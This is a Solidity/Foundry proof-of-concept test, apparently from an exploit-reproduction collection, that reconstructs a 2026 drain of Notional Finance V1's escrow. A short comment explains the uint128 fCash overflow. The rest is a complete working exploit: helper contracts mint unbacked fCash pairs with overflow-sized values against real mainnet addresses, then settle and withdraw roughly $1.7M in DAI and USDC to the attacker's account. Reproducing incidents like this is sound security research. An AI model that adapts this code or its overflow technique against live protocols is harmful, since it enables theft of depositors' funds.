// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Notional Finance (V1) escrow drain — Ethereum mainnet, 2026-09-03.
// ~$1.727M taken: 69,257.37 DAI + 1,658,524.86 USDC. Reported by Specter / PeckShield.
//
// Attacker EOA:  0xDaCC235a494750193695A111D715c2ca12b5Ce38
//   (helpers 0x8aaf01B6F9AcC973274B8718BE4D1C1be10E3be6 and
//    0xC95496c917A41a394EfdAC3e0882F5903D24De69 funded gas in the real incident).
//
// Root cause: Notional V1 books an ERC-1155 fCash transfer as a MINTED PAIR — a CASH_PAYER
// (debt / short, assetType 2) leg on `from` and a CASH_RECEIVER (claim / long, assetType 3)
// leg on `to` — even when `from` never held the token. The escrow nets each account's fCash
// in uint128 cash ladders. Minting a short of value ~2^128 overflows that ladder, so the
// unbacked long on the counterparty settles at maturity as a real, withdrawable cash claim
// sized to the escrow's entire live token balance, with no offsetting debt left behind.
//
// Two on-chain transactions, both from the attacker EOA, both fully permissionless (no signer /
// admin / privileged path anywhere — the whole thing is public mint -> settle -> withdraw):
//
//   TX1 0xe1589a19fe742f0d553889214abade69551fe944acffac014c28cc07b325d60a  (block 25900220)
//       Deploys the exploit contract + four helper accounts, then mints the overflowed fCash.
//       No ERC-20 leaves the protocol here; only the fCash pairs are created. The fCash on the
//       near market matures at ts 1788480000, ~73s after this block.
//
//   TX2 0xc3f3e318f7ab2d0daaba59e6ec901d25d1fe8a89aafe2b2b62e3b9aee1a24efa  (block 25900234)
//       After maturity: settle the unbacked long into cash and withdraw real DAI + USDC out of
//       the Notional escrow, forwarding them to the attacker EOA.
//
// This PoC reconstructs both transactions as ordinary Solidity that calls Notional's real
// functions directly — ERC1155Trade.encodeAssetId / safeTransferFrom / setApprovalForAll,
// Portfolios.settleMaturedAssets, Escrow.withdraw — with the exact overflow-triggering
// arguments observed on-chain (the huge fCash values are read live from the escrow's own token
// balances, exactly as the attacker sized them). No bytecode replay, no raw calldata blobs.
// The four helper accounts are real deployed Solidity contracts, matching the on-chain roles:
//   A1     seed leg (1-unit pair counterparty)
//   B_HUB  mule that holds the ~2^128 seed and pushes the overflowed shorts out
//   C_DAI  ends holding the fake DAI claim, settles + withdraws it
//   D_USDC ends holding the fake USDC claim, settles + withdraws it
//
// The arithmetic that overflows lives in Notional's own on-chain contracts; this file only
// issues the same public calls the attacker did.
//
// forge test --contracts src/test/2026-09/NotionalFinance_exp.sol -vvv

interface IERC1155Trade {
    function setApprovalForAll(
        address operator,
        bool approved
    ) external;
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external;
    function encodeAssetId(
        uint8 assetType,
        uint16 instrumentGroupId,
        uint32 maturity,
        bytes1 tradeType
    ) external view returns (uint256);
}

interface IPortfolios {
    function settleMaturedAssets(
        address account
    ) external;
    function freeCollateralViewAggregateOnly(
        address account
    ) external view returns (int256);
}

interface IEscrow {
    function withdraw(
        address token,
        uint128 amount
    ) external;
    function cashBalances(
        uint16 currency,
        address account
    ) external view returns (int256);
}

interface ICashMarket {
    function getActiveMaturities() external view returns (uint32[] memory);
}

// Real deployed helper account. Each on-chain helper was its own contract so Notional's
// per-account fCash ladders stay separate; the exploit orchestrator (its owner) drives it.
contract NotionalHelper {
    address internal immutable OWNER;
    IERC1155Trade internal immutable NOTIONAL;

    modifier onlyOwner() {
        require(msg.sender == OWNER, "not owner");
        _;
    }

    constructor(
        IERC1155Trade notional
    ) {
        OWNER = msg.sender;
        NOTIONAL = notional;
    }

    // Approve `operator` to move this account's fCash, so the pair-mint can assign this
    // account as the transfer counterparty.
    function approveOperator(
        address operator
    ) external onlyOwner {
        NOTIONAL.setApprovalForAll(operator, true);
    }

    // Push an fCash leg out of this account. Minting from an account that holds no such token
    // is exactly the bug: Notional creates the offsetting pair anyway.
    function pushFCash(
        address to,
        uint256 id,
        uint256 value
    ) external onlyOwner {
        NOTIONAL.safeTransferFrom(address(this), to, id, value, "");
    }

    // After maturity: settle this account's (overflowed) fCash claim into cash, withdraw the
    // real token out of the escrow, and forward it to the attacker EOA.
    function settleAndWithdraw(
        IPortfolios portfolios,
        IEscrow escrow,
        address token,
        uint128 amount,
        address to
    ) external onlyOwner {
        portfolios.settleMaturedAssets(address(this));
        escrow.withdraw(token, amount);
        IERC20(token).transfer(to, amount);
    }
}

// Exploit orchestrator — plays the on-chain "EXPLOIT" contract role: deploys the helpers,
// mints the overflowed fCash pairs in setup(), and settles/withdraws in drain().
contract NotionalExploit {
    IERC1155Trade internal constant NOTIONAL = IERC1155Trade(0xBbA899578bd3fA3DAa863A340f5600797993eF08);
    IPortfolios internal constant PORTFOLIOS = IPortfolios(0x0A4721117040ABF319b954aBF13F654505C34920);
    IEscrow internal constant ESCROW = IEscrow(0x9abd0b8868546105F6F48298eaDC1D9c82f7f683);
    ICashMarket internal constant CASH_MARKET_DAI = ICashMarket(0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba);
    ICashMarket internal constant CASH_MARKET_USDC = ICashMarket(0x918fC5c7Dc1d4aC8F6F3B4D7473153e62c0f045d);

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint16 internal constant CURRENCY_DAI = 1;
    uint16 internal constant CURRENCY_USDC = 2;

    // Trade-type byte the attacker used in every asset id (part of the ERC-1155 id encoding).
    bytes1 internal constant TRADE_TYPE = 0xA8;
    // uint128 cash-ladder overflow seed: the huge short whose netting wraps.
    uint256 internal constant OVERFLOW_SEED = type(uint128).max; // 2^128 - 1

    NotionalHelper public a1; // 1-unit seed counterparty
    NotionalHelper public bHub; // holds the overflow seed, pushes the shorts out
    NotionalHelper public cDai; // ends with the fake DAI claim
    NotionalHelper public dUsdc; // ends with the fake USDC claim

    uint32 internal maturityNear; // first active maturity (settles inside the incident window)
    uint32 internal maturityFar; // second active maturity (the seed leg)

    function setup() external {
        a1 = new NotionalHelper(NOTIONAL);
        bHub = new NotionalHelper(NOTIONAL);
        cDai = new NotionalHelper(NOTIONAL);
        dUsdc = new NotionalHelper(NOTIONAL);

        // Approval graph mirrors the incident: the seed counterparties approve this
        // orchestrator, and the claim recipients approve the mule that mints to them.
        a1.approveOperator(address(this));
        bHub.approveOperator(address(this));
        cDai.approveOperator(address(bHub));
        dUsdc.approveOperator(address(bHub));

        // Both currency markets expose the same two active maturities.
        uint32[] memory m = CASH_MARKET_DAI.getActiveMaturities();
        maturityNear = m[0];
        maturityFar = m[1];

        // Size the drain to the escrow's own live balances, exactly as the attacker did.
        uint256 escrowDai = IERC20(DAI).balanceOf(address(ESCROW));
        uint256 escrowUsdc = IERC20(USDC).balanceOf(address(ESCROW));

        // Real fCash ids via Notional's own encoder.
        uint256 idPayerNear = NOTIONAL.encodeAssetId(2, 0, maturityNear, TRADE_TYPE); // CASH_PAYER, near
        uint256 idPayerFar = NOTIONAL.encodeAssetId(2, 0, maturityFar, TRADE_TYPE); // CASH_PAYER, far
        uint256 idReceiverNear = NOTIONAL.encodeAssetId(3, 0, maturityNear, TRADE_TYPE); // CASH_RECEIVER, near

        // Seed 1: a 1-unit pair (this contract short, A1 long) on the near market.
        NOTIONAL.safeTransferFrom(address(this), address(a1), idPayerNear, 1, "");
        // Seed 2: a ~2^128 pair on the far market — the mule bHub takes the huge leg. This is
        // the collateral whose uint128 netting later wraps.
        NOTIONAL.safeTransferFrom(address(this), address(bHub), idPayerFar, OVERFLOW_SEED, "");

        // With only the offsetting seed pair, this account is still collateral-neutral.
        require(PORTFOLIOS.freeCollateralViewAggregateOnly(address(this)) == 0, "seed not neutral");

        // Mint the overflowed shorts out of bHub: a DAI-sized payer to cDai and a USDC-sized
        // receiver to dUsdc. bHub holds no near-maturity fCash, but Notional mints the pair
        // regardless, and the huge values overflow the escrow's uint128 ladder.
        bHub.pushFCash(address(cDai), idPayerNear, escrowDai);
        bHub.pushFCash(address(dUsdc), idReceiverNear, escrowUsdc);

        // After the overflow, the mule reads as (spuriously) over-collateralised rather than
        // deep in debt — the wrap that makes the whole thing pass Notional's own checks.
        require(PORTFOLIOS.freeCollateralViewAggregateOnly(address(bHub)) >= 0, "overflow check failed");
    }

    // TX2: settle the fake matured claims and pull the real tokens out to `to`.
    function drain(
        address to
    ) external {
        uint256 daiClaim = IERC20(DAI).balanceOf(address(ESCROW));
        uint256 usdcClaim = IERC20(USDC).balanceOf(address(ESCROW));

        cDai.settleAndWithdraw(PORTFOLIOS, ESCROW, DAI, uint128(daiClaim), to);
        dUsdc.settleAndWithdraw(PORTFOLIOS, ESCROW, USDC, uint128(usdcClaim), to);
    }
}

contract NotionalFinanceExp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xDaCC235a494750193695A111D715c2ca12b5Ce38;
    address internal constant NOTIONAL = 0xBbA899578bd3fA3DAa863A340f5600797993eF08; // ERC-1155 proxy
    address internal constant CUSTODY = 0x9abd0b8868546105F6F48298eaDC1D9c82f7f683; // escrow, holds DAI + USDC
    IERC20 internal constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Realized amounts observed on-chain in TX2.
    uint256 internal constant DAI_STOLEN = 69_257_372_677_950_923_155_658; // 69,257.37 DAI
    uint256 internal constant USDC_STOLEN = 1_658_524_864_122; // 1,658,524.86 USDC

    // Block / timestamps from the two incident transactions.
    uint256 internal constant FORK_BLOCK = 25_900_219; // parent of TX1's block
    uint256 internal constant TX1_TS = 1_788_479_927; // block 25900220
    uint256 internal constant TX2_TS = 1_788_480_095; // block 25900234, after fCash maturity 1788480000

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(NOTIONAL, "Notional1155");
        vm.label(CUSTODY, "Escrow");
        multiAssetLog = true;
        fundingTokens.push(address(DAI));
        fundingTokens.push(address(USDC));
        attacker = ATTACKER; // balanceLog tracks the attacker EOA
    }

    function testExploit() public balanceLog {
        uint256 attDaiBefore = DAI.balanceOf(ATTACKER);
        uint256 attUsdcBefore = USDC.balanceOf(ATTACKER);
        uint256 custDaiBefore = DAI.balanceOf(CUSTODY);
        uint256 custUsdcBefore = USDC.balanceOf(CUSTODY);

        // Act as the attacker EOA: msg.sender + tx.origin = ATTACKER for both txs.
        vm.startPrank(ATTACKER, ATTACKER);

        // --- TX1: deploy + mint the unbacked/overflowed fCash pairs. ---
        vm.warp(TX1_TS);
        NotionalExploit exploit = new NotionalExploit();
        exploit.setup();

        // --- TX2: after maturity, settle the fake claims and withdraw real DAI + USDC. ---
        vm.warp(TX2_TS);
        exploit.drain(ATTACKER);

        vm.stopPrank();

        uint256 attDaiGain = DAI.balanceOf(ATTACKER) - attDaiBefore;
        uint256 attUsdcGain = USDC.balanceOf(ATTACKER) - attUsdcBefore;
        uint256 custDaiLoss = custDaiBefore - DAI.balanceOf(CUSTODY);
        uint256 custUsdcLoss = custUsdcBefore - USDC.balanceOf(CUSTODY);

        emit log_named_decimal_uint("attacker DAI gain", attDaiGain, 18);
        emit log_named_decimal_uint("attacker USDC gain", attUsdcGain, 6);

        // Realized gain matches the incident to the wei, and equals the escrow's loss.
        assertEq(attDaiGain, DAI_STOLEN, "DAI gain mismatch");
        assertEq(attUsdcGain, USDC_STOLEN, "USDC gain mismatch");
        assertEq(custDaiLoss, DAI_STOLEN, "escrow DAI loss mismatch");
        assertEq(custUsdcLoss, USDC_STOLEN, "escrow USDC loss mismatch");
    }
}
